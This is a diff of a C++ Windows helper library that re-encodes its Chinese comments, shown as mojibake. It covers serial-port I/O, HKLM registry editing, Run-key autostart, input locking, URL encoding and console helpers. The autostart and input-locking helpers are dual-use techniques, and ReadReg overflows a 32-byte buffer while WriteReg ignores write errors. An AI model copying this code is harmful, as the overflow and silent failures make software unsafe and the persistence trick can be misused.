+	COMMTIMEOUTS TimeOuts;						//è¶…æ—¶å¤„ç†,å•ä½ï¼šæ¯«ç§’ï¼Œæ€»è¶…æ—¶ï¼æ—¶é—´ç³»æ•°Ã—è¯»æˆ–å†™çš„å­—ç¬¦æ•°ï¼‹æ—¶é—´å¸¸é‡
+	TimeOuts.ReadIntervalTimeout = 1000;		//è¯»é—´éš”è¶…æ—¶
+	TimeOuts.ReadTotalTimeoutMultiplier = 500;	//è¯»æ—¶é—´ç³»æ•°
+	TimeOuts.ReadTotalTimeoutConstant = 5000;	//è¯»æ—¶é—´å¸¸é‡
+	TimeOuts.WriteTotalTimeoutMultiplier = 500; // å†™æ—¶é—´ç³»æ•°
+	TimeOuts.WriteTotalTimeoutConstant = 2000;	//å†™æ—¶é—´å¸¸é‡
 	SetCommTimeouts(hCom, &TimeOuts);
-	PurgeComm(hCom, PURGE_TXCLEAR | PURGE_RXCLEAR); //Çå¿Õ´®¿Ú»º³åÇø
-	memcpy(pHandle, &hCom, sizeof(hCom));			// ±£´æ¾ä±ú
+	PurgeComm(hCom, PURGE_TXCLEAR | PURGE_RXCLEAR); //æ¸…ç©ºä¸²å£ç¼“å†²åŒº
+	memcpy(pHandle, &hCom, sizeof(hCom));			// ä¿å­˜å¥æŸ„
 	return true;
 }
 
 /**************************************************
- *  @brief          ¹Ø±Õ´®¿Ú
+ *  @brief          å…³é—­ä¸²å£
  *  @param          NULL
- *  @note           ·Ç¶ÀÁ¢Ä£¿é
- *  @Sample usage   open(¶Ë¿ÚºÅ);
- * 	@return         ³É¹¦·µ»Øtrue£¬Ê§°Ü·µ»Øfalse
+ *  @note           éç‹¬ç«‹æ¨¡å—
+ *  @Sample usage   open(ç«¯å£å·);
+ * 	@return         æˆåŠŸè¿”å›trueï¼Œå¤±è´¥è¿”å›false
  * 	@author         xbebhxx3
  * 	@version        1.0
  * 	@date           2022/8/13
@@ -691,11 +691,11 @@ void SerialPort::close()
 }
 
 /**************************************************
- *  @brief          ·¢ËÍÊı¾İ
- *  @param          dat:·¢ËÍµÄÊı¾İ
- *  @note           ·Ç¶ÀÁ¢Ä£¿é
- *  @Sample usage   send(·¢ËÍµÄÊı¾İ);
- * 	@return      	³É¹¦·µ»Ø·¢ËÍÊı¾İ³¤¶È£¬Ê§°Ü·µ»Ø0
+ *  @brief          å‘é€æ•°æ®
+ *  @param          dat:å‘é€çš„æ•°æ®
+ *  @note           éç‹¬ç«‹æ¨¡å—
+ *  @Sample usage   send(å‘é€çš„æ•°æ®);
+ * 	@return      	æˆåŠŸè¿”å›å‘é€æ•°æ®é•¿åº¦ï¼Œå¤±è´¥è¿”å›0
  * 	@author         xbebhxx3
  * 	@version        1.0
  * 	@date           2022/8/13
@@ -705,29 +705,29 @@ int SerialPort::send(string dat)
 {
 	HANDLE hCom = *(HANDLE *)pHandle;
 	if (this->synchronizeflag)
-	{																							   // Í¬²½·½Ê½
-		DWORD dwBytesWrite = dat.length();														   //³É¹¦Ğ´ÈëµÄÊı¾İ×Ö½ÚÊı
-		BOOL bWriteStat = WriteFile(hCom, (char *)dat.c_str(), dwBytesWrite, &dwBytesWrite, NULL); //Í¬²½·¢ËÍ
+	{																							   // åŒæ­¥æ–¹å¼
+		DWORD dwBytesWrite = dat.length();														   //æˆåŠŸå†™å…¥çš„æ•°æ®å­—èŠ‚æ•°
+		BOOL bWriteStat = WriteFile(hCom, (char *)dat.c_str(), dwBytesWrite, &dwBytesWrite, NULL); //åŒæ­¥å‘é€
 		if (!bWriteStat)
 			return 0;
 		return dwBytesWrite;
 	}
 	else
-	{																									 //Òì²½·½Ê½
-		DWORD dwBytesWrite = dat.length();																 //³É¹¦Ğ´ÈëµÄÊı¾İ×Ö½ÚÊı
-		DWORD dwErrorFlags;																				 //´íÎó±êÖ¾
-		COMSTAT comStat;																				 //Í¨Ñ¶×´Ì¬
-		OVERLAPPED m_osWrite;																			 //Òì²½ÊäÈëÊä³ö½á¹¹Ìå
-		memset(&m_osWrite, 0, sizeof(m_osWrite));														 //´´½¨Ò»¸öÓÃÓÚOVERLAPPEDµÄÊÂ¼ş´¦Àí£¬²»»áÕæÕıÓÃµ½£¬µ«ÏµÍ³ÒªÇóÕâÃ´×ö
-		ClearCommError(hCom, &dwErrorFlags, &comStat);													 //Çå³ıÍ¨Ñ¶´íÎó£¬»ñµÃÉè±¸µ±Ç°×´Ì¬
-		BOOL bWriteStat = WriteFile(hCom, (char *)dat.c_str(), dwBytesWrite, &dwBytesWrite, &m_osWrite); //Òì²½·¢ËÍ
+	{																									 //å¼‚æ­¥æ–¹å¼
+		DWORD dwBytesWrite = dat.length();																 //æˆåŠŸå†™å…¥çš„æ•°æ®å­—èŠ‚æ•°
+		DWORD dwErrorFlags;																				 //é”™è¯¯æ ‡å¿—
+		COMSTAT comStat;																				 //é€šè®¯çŠ¶æ€
+		OVERLAPPED m_osWrite;																			 //å¼‚æ­¥è¾“å…¥è¾“å‡ºç»“æ„ä½“
+		memset(&m_osWrite, 0, sizeof(m_osWrite));														 //åˆ›å»ºä¸€ä¸ªç”¨äºOVERLAPPEDçš„äº‹ä»¶å¤„ç†ï¼Œä¸ä¼šçœŸæ­£ç”¨åˆ°ï¼Œä½†ç³»ç»Ÿè¦æ±‚è¿™ä¹ˆåš
+		ClearCommError(hCom, &dwErrorFlags, &comStat);													 //æ¸…é™¤é€šè®¯é”™è¯¯ï¼Œè·å¾—è®¾å¤‡å½“å‰çŠ¶æ€
+		BOOL bWriteStat = WriteFile(hCom, (char *)dat.c_str(), dwBytesWrite, &dwBytesWrite, &m_osWrite); //å¼‚æ­¥å‘é€
 		if (!bWriteStat)
 			if (GetLastError() == ERROR_IO_PENDING)
-				WaitForSingleObject(m_osWrite.hEvent, 500); //Èç¹û´®¿ÚÕıÔÚĞ´ÈëµÈ´ıĞ´ÈëÊÂ¼ş0.5ÃëÖÓ
+				WaitForSingleObject(m_osWrite.hEvent, 500); //å¦‚æœä¸²å£æ­£åœ¨å†™å…¥ç­‰å¾…å†™å…¥äº‹ä»¶0.5ç§’é’Ÿ
 			else
 			{
-				ClearCommError(hCom, &dwErrorFlags, &comStat); //Çå³ıÍ¨Ñ¶´íÎó
-				CloseHandle(m_osWrite.hEvent);				   //¹Ø±Õ²¢ÊÍ·ÅhEventÄÚ´æ
+				ClearCommError(hCom, &dwErrorFlags, &comStat); //æ¸…é™¤é€šè®¯é”™è¯¯
+				CloseHandle(m_osWrite.hEvent);				   //å…³é—­å¹¶é‡Šæ”¾hEventå†…å­˜
 				return 0;
 			}
 		return dwBytesWrite;
@@ -735,11 +735,11 @@ int SerialPort::send(string dat)
 }
 
 /**************************************************
- *  @brief          ½ÓÊÕÊı¾İ
+ *  @brief          æ¥æ”¶æ•°æ®
  *  @param          NULL
- *  @note           ·Ç¶ÀÁ¢Ä£¿é
+ *  @note           éç‹¬ç«‹æ¨¡å—
  *  @Sample usage   receive();
- * 	@return         Êı¾İ
+ * 	@return         æ•°æ®
  * 	@author         xbebhxx3
  * 	@version        3.0
  * 	@date           2022/8/13
@@ -751,9 +751,9 @@ string SerialPort::receive()
 	string rec_str = "";
 	char buf[1024];
 	if (this->synchronizeflag)
-	{																 //Í¬²½·½Ê½
-		DWORD wCount = 1024;										 //³É¹¦¶ÁÈ¡µÄÊı¾İ×Ö½ÚÊı
-		BOOL bReadStat = ReadFile(hCom, buf, wCount, &wCount, NULL); //Í¬²½½ÓÊÕ
+	{																 //åŒæ­¥æ–¹å¼
+		DWORD wCount = 1024;										 //æˆåŠŸè¯»å–çš„æ•°æ®å­—èŠ‚æ•°
+		BOOL bReadStat = ReadFile(hCom, buf, wCount, &wCount, NULL); //åŒæ­¥æ¥æ”¶
 		for (int i = 0; i < strlen(buf); i++)
 		{
 			if (buf[i] != -52)
@@ -764,24 +764,24 @@ string SerialPort::receive()
 		return rec_str;
 	}
 	else
-	{												   //Òì²½·½Ê½
-		DWORD wCount = 1024;						   //³É¹¦¶ÁÈ¡µÄÊı¾İ×Ö½ÚÊı
-		DWORD dwErrorFlags;							   //´íÎó±êÖ¾
-		COMSTAT comStat;							   //Í¨Ñ¶×´Ì¬
-		OVERLAPPED m_osRead;						   //Òì²½ÊäÈëÊä³ö½á¹¹Ìå
-		memset(&m_osRead, 0, sizeof(m_osRead));		   //´´½¨Ò»¸öÓÃÓÚOVERLAPPEDµÄÊÂ¼ş´¦Àí£¬²»»áÕæÕıÓÃµ½£¬µ«ÏµÍ³ÒªÇóÕâÃ´×ö
-		ClearCommError(hCom, &dwErrorFlags, &comStat); //Çå³ıÍ¨Ñ¶´íÎó£¬»ñµÃÉè±¸µ±Ç°×´Ì¬
+	{												   //å¼‚æ­¥æ–¹å¼
+		DWORD wCount = 1024;						   //æˆåŠŸè¯»å–çš„æ•°æ®å­—èŠ‚æ•°
+		DWORD dwErrorFlags;							   //é”™è¯¯æ ‡å¿—
+		COMSTAT comStat;							   //é€šè®¯çŠ¶æ€
+		OVERLAPPED m_osRead;						   //å¼‚æ­¥è¾“å…¥è¾“å‡ºç»“æ„ä½“
+		memset(&m_osRead, 0, sizeof(m_osRead));		   //åˆ›å»ºä¸€ä¸ªç”¨äºOVERLAPPEDçš„äº‹ä»¶å¤„ç†ï¼Œä¸ä¼šçœŸæ­£ç”¨åˆ°ï¼Œä½†ç³»ç»Ÿè¦æ±‚è¿™ä¹ˆåš
+		ClearCommError(hCom, &dwErrorFlags, &comStat); //æ¸…é™¤é€šè®¯é”™è¯¯ï¼Œè·å¾—è®¾å¤‡å½“å‰çŠ¶æ€
 		if (!comStat.cbInQue)
-			return "";													  //Èç¹ûÊäÈë»º³åÇø×Ö½ÚÊıÎª0£¬Ôò·µ»Øfalse
-		BOOL bReadStat = ReadFile(hCom, buf, wCount, &wCount, &m_osRead); //Òì²½½ÓÊÕ
+			return "";													  //å¦‚æœè¾“å…¥ç¼“å†²åŒºå­—èŠ‚æ•°ä¸º0ï¼Œåˆ™è¿”å›false
+		BOOL bReadStat = ReadFile(hCom, buf, wCount, &wCount, &m_osRead); //å¼‚æ­¥æ¥æ”¶
 		if (!bReadStat)
 		{
 			if (GetLastError() == ERROR_IO_PENDING)
-				GetOverlappedResult(hCom, &m_osRead, &wCount, TRUE); //Èç¹û´®¿ÚÕıÔÚ¶ÁÈ¡ÖĞ£¬GetOverlappedResultº¯ÊıµÄ×îºóÒ»¸ö²ÎÊıÉèÎªTRUE£¬º¯Êı»áÒ»Ö±µÈ´ı£¬Ö±µ½¶Á²Ù×÷Íê³É»òÓÉÓÚ´íÎó¶ø·µ»Ø
+				GetOverlappedResult(hCom, &m_osRead, &wCount, TRUE); //å¦‚æœä¸²å£æ­£åœ¨è¯»å–ä¸­ï¼ŒGetOverlappedResultå‡½æ•°çš„æœ€åä¸€ä¸ªå‚æ•°è®¾ä¸ºTRUEï¼Œå‡½æ•°ä¼šä¸€ç›´ç­‰å¾…ï¼Œç›´åˆ°è¯»æ“ä½œå®Œæˆæˆ–ç”±äºé”™è¯¯è€Œè¿”å›
 			else
 			{
-				ClearCommError(hCom, &dwErrorFlags, &comStat); //Çå³ıÍ¨Ñ¶´íÎó
-				CloseHandle(m_osRead.hEvent);				   //¹Ø±Õ²¢ÊÍ·ÅhEventµÄÄÚ´æ
+				ClearCommError(hCom, &dwErrorFlags, &comStat); //æ¸…é™¤é€šè®¯é”™è¯¯
+				CloseHandle(m_osRead.hEvent);				   //å…³é—­å¹¶é‡Šæ”¾hEventçš„å†…å­˜
 				return "";
 			}
 		}
@@ -795,16 +795,16 @@ string SerialPort::receive()
 		return rec_str;
 	}
 }
-//´®¿Ú²Ù×÷½áÊø
+//ä¸²å£æ“ä½œç»“æŸ
 
-//×¢²á±í²Ù×÷¿ªÊ¼
+//æ³¨å†Œè¡¨æ“ä½œå¼€å§‹
 
 /**************************************************
- *  @brief          ¶Á×¢²á±í
- *  @param          path:Â·¾¶ key£ºkey
- *  @note           Í·ÎÄ¼ş£º #include <windows.h>
+ *  @brief          è¯»æ³¨å†Œè¡¨
+ *  @param          path:è·¯å¾„ keyï¼škey
+ *  @note           å¤´æ–‡ä»¶ï¼š #include <windows.h>
  *  @Sample usage   ReadReg("Software\\xbebhxx3", "aaa");
- *  @return         ×¢²á±íÖµ£¬0ÎªÊ§°Ü
+ *  @return         æ³¨å†Œè¡¨å€¼ï¼Œ0ä¸ºå¤±è´¥
  *  @author         xbebhxx3
  *  @version        1.0
  *  @date           2022/3/28
@@ -814,25 +814,25 @@ char *ReadReg(const char *path, const char *key)
 {
 	static char value[32] = {0};
 	HKEY hKey;
-	int ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_EXECUTE, &hKey); //´ò¿ª×¢²á±í
+	int ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_EXECUTE, &hKey); //æ‰“å¼€æ³¨å†Œè¡¨
 	if (ret != ERROR_SUCCESS)
 		return 0;
-	//¶ÁÈ¡KEY
-	DWORD dwType = REG_SZ; //Êı¾İÀàĞÍ
+	//è¯»å–KEY
+	DWORD dwType = REG_SZ; //æ•°æ®ç±»å‹
 	DWORD cbData = 256;
-	ret = RegQueryValueEx(hKey, key, NULL, &dwType, (LPBYTE)value, &cbData); //¶ÁÈ¡×¢²á±í
+	ret = RegQueryValueEx(hKey, key, NULL, &dwType, (LPBYTE)value, &cbData); //è¯»å–æ³¨å†Œè¡¨
 	if (ret == ERROR_SUCCESS)
 	{
-		RegCloseKey(hKey); //¹Ø±Õ×¢²á±í
+		RegCloseKey(hKey); //å…³é—­æ³¨å†Œè¡¨
 		return value;
 	}
 }
 /**************************************************
- *  @brief          Ğ´×¢²á±í
- *  @param          path:Â·¾¶ key£ºkey, value£ºÖµ
- *  @note           Í·ÎÄ¼ş£º #include <windows.h>
+ *  @brief          å†™æ³¨å†Œè¡¨
+ *  @param          path:è·¯å¾„ keyï¼škey, valueï¼šå€¼
+ *  @note           å¤´æ–‡ä»¶ï¼š #include <windows.h>
  *  @Sample usage   WriteReg("Software\\xbebhxx3", "aaa", "bbb");
- *  @return         1³É¹¦£¬0Ê§°Ü
+ *  @return         1æˆåŠŸï¼Œ0å¤±è´¥
  *  @author         xbebhxx3
  *  @version        1.0
  *  @date           2022/3/28
@@ -842,24 +842,24 @@ bool WriteReg(const char *path, const char *key, const char *value)
 {
 	HKEY hKey;
 	DWORD dwDisp;
-	DWORD dwType = REG_SZ;																										//Êı¾İÀàĞÍ
-	int ret = RegCreateKeyEx(HKEY_LOCAL_MACHINE, path, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisp); //´ò¿ª×¢²á±í
+	DWORD dwType = REG_SZ;																										//æ•°æ®ç±»å‹
+	int ret = RegCreateKeyEx(HKEY_LOCAL_MACHINE, path, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisp); //æ‰“å¼€æ³¨å†Œè¡¨
 	if (ret != ERROR_SUCCESS)
 	{
-		RegCloseKey(hKey); //¹Ø±Õ×¢²á±í
+		RegCloseKey(hKey); //å…³é—­æ³¨å†Œè¡¨
 		return 0;
 	}
-	ret == RegSetValueEx(hKey, key, 0, dwType, (BYTE *)value, strlen(value)); //Ğ´Èë×¢²á±í
-	RegCloseKey(hKey);														  //¹Ø±Õ×¢²á±í
+	ret == RegSetValueEx(hKey, key, 0, dwType, (BYTE *)value, strlen(value)); //å†™å…¥æ³¨å†Œè¡¨
+	RegCloseKey(hKey);														  //å…³é—­æ³¨å†Œè¡¨
 	return 1;
 }
 
 /**************************************************
- *  @brief          É¾³ı×¢²á±íÏî
- *  @param          path:Â·¾¶
- *  @note           Í·ÎÄ¼ş£º #include <windows.h>
+ *  @brief          åˆ é™¤æ³¨å†Œè¡¨é¡¹
+ *  @param          path:è·¯å¾„
+ *  @note           å¤´æ–‡ä»¶ï¼š #include <windows.h>
  *  @Sample usage   DelReg("Software\\xbebhxx3");
- *  @return         1³É¹¦£¬0Ê§°Ü
+ *  @return         1æˆåŠŸï¼Œ0å¤±è´¥
  *  @author         xbebhxx3
  *  @version        1.0
  *  @date           2022/3/28
@@ -867,7 +867,7 @@ bool WriteReg(const char *path, const char *key, const char *value)
  **************************************************/
 bool DelReg(const char *path)
 {
-	int ret = RegDeleteKey(HKEY_LOCAL_MACHINE, path); //É¾³ı×¢²á±í
+	int ret = RegDeleteKey(HKEY_LOCAL_MACHINE, path); //åˆ é™¤æ³¨å†Œè¡¨
 	if (ret == ERROR_SUCCESS)
 		return 1;
 	else
@@ -875,11 +875,11 @@ bool DelReg(const char *path)
 }
 
 /**************************************************
- *  @brief          É¾³ı×¢²á±íÖµ
- *  @param          path:Â·¾¶, value£ºÖµ
- *  @note           Í·ÎÄ¼ş£º #include <windows.h>
+ *  @brief          åˆ é™¤æ³¨å†Œè¡¨å€¼
+ *  @param          path:è·¯å¾„, valueï¼šå€¼
+ *  @note           å¤´æ–‡ä»¶ï¼š #include <windows.h>
  *  @Sample usage   DelRegValue("Software\\xbebhxx3","aaa");
- *  @return         1³É¹¦£¬0Ê§°Ü
+ *  @return         1æˆåŠŸï¼Œ0å¤±è´¥
  *  @author         xbebhxx3
  *  @version        1.0
  *  @date           2022/3/28
@@ -888,24 +888,24 @@ bool DelReg(const char *path)
 bool DelRegValue(const char *path, const char *Value)
 {
 	HKEY hKey;
-	LONG ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_QUERY_VALUE | KEY_WRITE, &hKey); //´ò¿ª×¢²á±í
+	LONG ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_QUERY_VALUE | KEY_WRITE, &hKey); //æ‰“å¼€æ³¨å†Œè¡¨
 	if (ret == ERROR_SUCCESS)
 	{
-		RegDeleteValue(hKey, Value); //É¾³ı×¢²á±í
-		RegCloseKey(hKey);			 //¹Ø±Õ×¢²á±í
+		RegDeleteValue(hKey, Value); //åˆ é™¤æ³¨å†Œè¡¨
+		RegCloseKey(hKey);			 //å…³é—­æ³¨å†Œè¡¨
 		return 1;
 	}
-	RegCloseKey(hKey); //¹Ø±Õ×¢²á±í
+	RegCloseKey(hKey); //å…³é—­æ³¨å†Œè¡¨
 	return 0;
 }
 
 /**************************************************
- *  @brief          ÉèÖÃ¿ª»ú×ÔÆô
- *  @param          name:³ÌĞòÃû£¬fSuspend:1¿ªÆô£¬0¹Ø±Õ
- *  @note           Í·ÎÄ¼ş£º #include <windows.h>
+ *  @brief          è®¾ç½®å¼€æœºè‡ªå¯
+ *  @param          name:ç¨‹åºåï¼ŒfSuspend:1å¼€å¯ï¼Œ0å…³é—­
+ *  @note           å¤´æ–‡ä»¶ï¼š #include <windows.h>
  *  @calls          WriteReg,DelRegValue
- *  @Sample usage   AutoRun(³ÌĞòÃû£¬1);
- *  @return         1³É¹¦£¬0Ê§°Ü
+ *  @Sample usage   AutoRun(ç¨‹åºåï¼Œ1);
+ *  @return         1æˆåŠŸï¼Œ0å¤±è´¥
  *  @author         xbebhxx3
  *  @version        2.0
  *  @date           2021/10/4
@@ -917,23 +917,23 @@ bool AutoRun(const char *name, BOOL fSuspend)
 	{
 		char szFilePath[MAX_PATH + 1] = {0};
 		GetModuleFileNameA(NULL, szFilePath, MAX_PATH);
-		return WriteReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", name, szFilePath); //Ğ´Èë×¢²á±íÖµ
+		return WriteReg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", name, szFilePath); //å†™å…¥æ³¨å†Œè¡¨å€¼
 	}
 	else
 	{
-		return DelRegValue("Software\\Microsoft\\Windows\\CurrentVersion\\Run", name); //É¾³ı×¢²á±íÖµ
+		return DelRegValue("Software\\Microsoft\\Windows\\CurrentVersion\\Run", name); //åˆ é™¤æ³¨å†Œè¡¨å€¼
 	}
 }
 
-//×¢²á±í²Ù×÷½áÊø
+//æ³¨å†Œè¡¨æ“ä½œç»“æŸ
 
-//±à/½âÂë²Ù×÷¿ªÊ¼
+//ç¼–/è§£ç æ“ä½œå¼€å§‹
 
 /**************************************************
- *  @brief          Url±àÂë
- *  @param          ĞèÒª±àÂëµÄ¶«Î÷
- *  @Sample usage   CodeUrl(ĞèÒª±àÂëµÄ¶«Î÷);
- *  @return     	±àÂëºóµÄ
+ *  @brief          Urlç¼–ç 
+ *  @param          éœ€è¦ç¼–ç çš„ä¸œè¥¿
+ *  @Sample usage   CodeUrl(éœ€è¦ç¼–ç çš„ä¸œè¥¿);
+ *  @return     	ç¼–ç åçš„
  *  @author         xbebhxx3
  *  @version        2.0
  *  @date           2021/10/14
@@ -970,10 +970,10 @@ string CodeUrl(const string &URL)
 }
 
 /**************************************************
- *  @brief          Url½âÂë
- *  @param          ĞèÒª½âÂëµÄ¶«Î÷
- *  @Sample usage   decodeUrl(ĞèÒª½âÂëµÄ¶«Î÷);
- *  @return     	½âÂëºóµÄ
+ *  @brief          Urlè§£ç 
+ *  @param          éœ€è¦è§£ç çš„ä¸œè¥¿
+ *  @Sample usage   decodeUrl(éœ€è¦è§£ç çš„ä¸œè¥¿);
+ *  @return     	è§£ç åçš„
  *  @author         xbebhxx3
  *  @version        2.0
  *  @date           2021/10/14
@@ -1011,10 +1011,10 @@ string DecodeUrl(const string &URL)
 }
 
 /**************************************************
- *  @brief          ¼ÓÃÜ
- *  @param          ĞèÒª¼ÓÃÜµÄ¶«Î÷
- *  @Sample usage   x3code(ĞèÒª¼ÓÃÜµÄ¶«Î÷);
- *  @return     	¼ÓÃÜºóµÄ
+ *  @brief          åŠ å¯†
+ *  @param          éœ€è¦åŠ å¯†çš„ä¸œè¥¿
+ *  @Sample usage   x3code(éœ€è¦åŠ å¯†çš„ä¸œè¥¿);
+ *  @return     	åŠ å¯†åçš„
  *  @author         xbebhxx3
  *  @version        1.0
  *  @date           2022/3/30
@@ -1053,53 +1053,53 @@ string x3code(string c)
 	}
 	return c;
 }
-//±àÂë²Ù×÷½áÊø
+//ç¼–ç æ“ä½œç»“æŸ
 
-//¸Ä±äÑÕÉ«¿ªÊ¼
+//æ”¹å˜é¢œè‰²å¼€å§‹
 
 /**************************************************
- *  @brief          RGB³õÊ¼»¯
+ *  @brief          RGBåˆå§‹åŒ–
  *  @Sample usage   rgb_init()
- *  @note	    	Í·ÎÄ¼ş£º #include<Windows.h>
+ *  @note	    	å¤´æ–‡ä»¶ï¼š #include<Windows.h>
  *  @author         jlx
  *  @version        1.0
  *  @date           2022/3/5
  **************************************************/
 void rgb_init()
-{												   // ³õÊ¼»¯
-	HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);   //ÊäÈë¾ä±ú
-	HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE); //Êä³ö¾ä±ú
+{												   // åˆå§‹åŒ–
+	HANDLE hIn = GetStdHandle(STD_INPUT_HANDLE);   //è¾“å…¥å¥æŸ„
+	HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE); //è¾“å‡ºå¥æŸ„
 	DWORD dwInMode, dwOutMode;
-	GetConsoleMode(hIn, &dwInMode);	  //»ñÈ¡¿ØÖÆÌ¨ÊäÈëÄ£Ê½
-	GetConsoleMode(hOut, &dwOutMode); //»ñÈ¡¿ØÖÆÌ¨Êä³öÄ£Ê½
-	dwInMode |= 0x0200;				  //¸ü¸Ä
+	GetConsoleMode(hIn, &dwInMode);	  //è·å–æ§åˆ¶å°è¾“å…¥æ¨¡å¼
+	GetConsoleMode(hOut, &dwOutMode); //è·å–æ§åˆ¶å°è¾“å‡ºæ¨¡å¼
+	dwInMode |= 0x0200;				  //æ›´æ”¹
 	dwOutMode |= 0x0004;
-	SetConsoleMode(hIn, dwInMode);	 //ÉèÖÃ¿ØÖÆÌ¨ÊäÈëÄ£Ê½
-	SetConsoleMode(hOut, dwOutMode); //ÉèÖÃ¿ØÖÆÌ¨Êä³öÄ£Ê½
+	SetConsoleMode(hIn, dwInMode);	 //è®¾ç½®æ§åˆ¶å°è¾“å…¥æ¨¡å¼
+	SetConsoleMode(hOut, dwOutMode); //è®¾ç½®æ§åˆ¶å°è¾“å‡ºæ¨¡å¼
 }
 
 /**************************************************
- *  @brief          RGBÉèÖÃ
- *  @param	    	wr:×ÖÌåºì,wg:×ÖÌåÂÌ,wb:×ÖÌåÀ¶,br:±³¾°ºì,bg:±³¾°ÂÌ,bb:±³¾°À¶ (0-255)
+ *  @brief          RGBè®¾ç½®
+ *  @param	    	wr:å­—ä½“çº¢,wg:å­—ä½“ç»¿,wb:å­—ä½“è“,br:èƒŒæ™¯çº¢,bg:èƒŒæ™¯ç»¿,bb:èƒŒæ™¯è“ (0-255)
  *  @Sample usage   rgb_set(255,255,255,0,0,0);
- *  @note	    	ÔÚÕâÖ®Ç°ÏÈÔËĞĞ rgb_init();
+ *  @note	    	åœ¨è¿™ä¹‹å‰å…ˆè¿è¡Œ rgb_init();
  *  @author         jlx
  *  @version        1.0
  *  @date           2022/3/5
  **************************************************/
 void rgb_set(int wr, int wg, int wb, int br, int bg, int bb)
 {
-	printf("\033[38;2;%d;%d;%dm\033[48;2;%d;%d;%dm", wr, wg, wb, br, bg, bb); //\033[38±íÊ¾Ç°¾°£¬\033[48±íÊ¾±³¾°£¬Èı¸ö%d±íÊ¾»ìºÏµÄÊı
+	printf("\033[38;2;%d;%d;%dm\033[48;2;%d;%d;%dm", wr, wg, wb, br, bg, bb); //\033[38è¡¨ç¤ºå‰æ™¯ï¼Œ\033[48è¡¨ç¤ºèƒŒæ™¯ï¼Œä¸‰ä¸ª%dè¡¨ç¤ºæ··åˆçš„æ•°
 }
 
-//¸Ä±äÑÕÉ«½áÊø
+//æ”¹å˜é¢œè‰²ç»“æŸ
 
 /**************************************************
- *  @brief          Ëø¶¨Êó±ê¼üÅÌ (ĞèÒª¹ÜÀíÔ±È¨ÏŞ)
+ *  @brief          é”å®šé¼ æ ‡é”®ç›˜ (éœ€è¦ç®¡ç†å‘˜æƒé™)
  *  @param          NULL
- *  @return         1³É¹¦£¬0Ê§°Ü
- *  @note           Í·ÎÄ¼ş£º #include <Windows.h>
- *  @Sample usage   lockkm(1); Ëø¶¨£¬lockkm(0); ½âËø
+ *  @return         1æˆåŠŸï¼Œ0å¤±è´¥
+ *  @note           å¤´æ–‡ä»¶ï¼š #include <Windows.h>
+ *  @Sample usage   lockkm(1); é”å®šï¼Œlockkm(0); è§£é”
  *  @author         xbebhxx3
  *  @version        1.0
  *  @date           2022/3/28
@@ -1124,10 +1124,10 @@ bool lockkm(bool lockb = false)
 }
 
 /**************************************************
- *  @brief          »ñµÃÊó±êÎ»ÖÃ
+ *  @brief          è·å¾—é¼ æ ‡ä½ç½®
  *  @param          NULL
- *  @note           Í·ÎÄ¼ş£º #include <Windows.h>
- *  @Sample usage   mouxy(Êó±êx×ø±ê£¬y×ø±ê);
+ *  @note           å¤´æ–‡ä»¶ï¼š #include <Windows.h>
+ *  @Sample usage   mouxy(é¼ æ ‡xåæ ‡ï¼Œyåæ ‡);
  *  @author         xbebhxx3
  *  @version        1.0
  *  @date           2021/5/2
@@ -1136,15 +1136,15 @@ bool lockkm(bool lockb = false)
 void mouxy(int &x, int &y)
 {
 	POINT p;
-	GetCursorPos(&p); //»ñÈ¡Êó±ê×ø±ê
+	GetCursorPos(&p); //è·å–é¼ æ ‡åæ ‡
 	x = p.x;
 	y = p.y;
 }
 
 /**************************************************
- *  @brief          ÇåÆÁ
+ *  @brief          æ¸…å±
  *  @param          NULL
- *  @note           Í·ÎÄ¼ş£º #include <Windows.h>
+ *  @note           å¤´æ–‡ä»¶ï¼š #include <Windows.h>
  *  @Sample usage   cls();
  *  @author         xbebhxx3
  *  @version        1.0
@@ -1153,23 +1153,23 @@ void mouxy(int &x, int &y)
  **************************************************/
 void cls()
 {
-	HANDLE hdout = GetStdHandle(STD_OUTPUT_HANDLE);		 //»ñÈ¡±ê×¼Êä³öÉè±¸µÄ¾ä±ú
-	CONSOLE_SCREEN_BUFFER_INFO csbi;					 //¶¨Òå±íÊ¾ÆÁÄ»»º³åÇøÊôĞÔµÄ±äÁ¿
-	GetConsoleScreenBufferInfo(hdout, &csbi);			 //»ñÈ¡±ê×¼Êä³öÉè±¸µÄÆÁÄ»»º³åÇøÊôĞÔ
-	DWORD size = csbi.dwSize.X * csbi.dwSize.Y, num = 0; //¶¨ÒåË«×Ö½Ú±äÁ¿
-	COORD pos = {0, 0};									 //±íÊ¾×ø±êµÄ±äÁ¿£¨³õÊ¼»¯Îª×óÉÏ½Ç(0, 0)µã£©
+	HANDLE hdout = GetStdHandle(STD_OUTPUT_HANDLE);		 //è·å–æ ‡å‡†è¾“å‡ºè®¾å¤‡çš„å¥æŸ„
+	CONSOLE_SCREEN_BUFFER_INFO csbi;					 //å®šä¹‰è¡¨ç¤ºå±å¹•ç¼“å†²åŒºå±æ€§çš„å˜é‡
+	GetConsoleScreenBufferInfo(hdout, &csbi);			 //è·å–æ ‡å‡†è¾“å‡ºè®¾å¤‡çš„å±å¹•ç¼“å†²åŒºå±æ€§
+	DWORD size = csbi.dwSize.X * csbi.dwSize.Y, num = 0; //å®šä¹‰åŒå­—èŠ‚å˜é‡
+	COORD pos = {0, 0};									 //è¡¨ç¤ºåæ ‡çš„å˜é‡ï¼ˆåˆå§‹åŒ–ä¸ºå·¦ä¸Šè§’(0, 0)ç‚¹ï¼‰
 
-	//°Ñ´°¿Ú»º³åÇøÈ«²¿Ìî³äÎª¿Õ¸ñ²¢Ìî³äÎªÄ¬ÈÏÑÕÉ«£¨ÇåÆÁ£©
